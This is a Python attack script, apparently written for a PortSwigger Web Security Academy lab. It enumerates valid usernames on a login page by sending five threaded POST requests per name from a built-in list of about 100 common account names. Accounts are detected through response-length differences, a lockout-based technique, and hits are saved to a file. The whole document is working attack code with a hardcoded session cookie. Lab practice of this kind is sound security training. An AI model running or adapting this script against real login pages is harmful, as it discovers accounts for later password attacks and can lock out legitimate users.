from requests import post
from concurrent.futures import ThreadPoolExecutor

# Coloque a URL do lab aqui
baseurl = "https://0a3300d70408767d82a0568c00b700f9.web-security-academy.net"
url = f"{baseurl}/login"

headers = {
    "Cookie": "session=Y3vl11wP8BDBm5lwPpMkinVCd4hJrDAm",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": baseurl,
    "Referer": url,
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers",
    "Connection": "keep-alive"
}



user_list = [
'carlos',
'root',
'admin',
'test',
'guest',
'info',
'adm',
'mysql',
'user',
'administrator',
'oracle',
'ftp',
'pi',
'puppet',
'ansible',
'ec2-user',
'vagrant',
'azureuser',
'academico',
'acceso',
'access',
'accounting',
'accounts',
'acid',
'activestat',
'ad',
'adam',
'adkit',
'admin',
'administracion',
'administrador',
'administrator',
'administrators',
'admins',
'ads',
'adserver',
'adsl',
'ae',
'af',
'affiliate',
'affiliates',
'afiliados',
'ag',
'agenda',
'agent',
'ai',
'aix',
'ajax',
'ak',
'akamai',
'al',
'alabama',
'alaska',
'albuquerque',
'alerts',
'alpha',
'alterwind',
'am',
'amarillo',
'americas',
'an',
'anaheim',
'analyzer',
'announce',
'announcements',
'antivirus',
'ao',
'ap',
'apache',
'apollo',
'app',
'app01',
'app1',
'apple',
'application',
'applications',
'apps',
'appserver',
'aq',
'ar',
'archie',
'arcsight',
'argentina',
'arizona',
'arkansas',
'arlington',
'as',
'as400',
'asia',
'asterix',
'at',
'athena',
'atlanta',
'atlas',
'att',
'au',
'auction',
'austin',
'auth',
'auto',
'autodiscover',
]

def send_request(user):
    for i in range(5):
        data = {
            "username": user,
            "password": "anyway"
        }
        response = post(url, headers=headers, data=data)
        if len(response.content) != 3132:
            print(f'\033[92mUser: {user}, response: {len(response.content)}\033[0m')
            with open('UsernameEnumerationUser.txt', 'w') as f:
                f.write(f'{user}\n')
        print(f'User: {user}, response: {len(response.content)}')

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(send_request, user) for user in user_list]
    for future in futures:
        future.result()




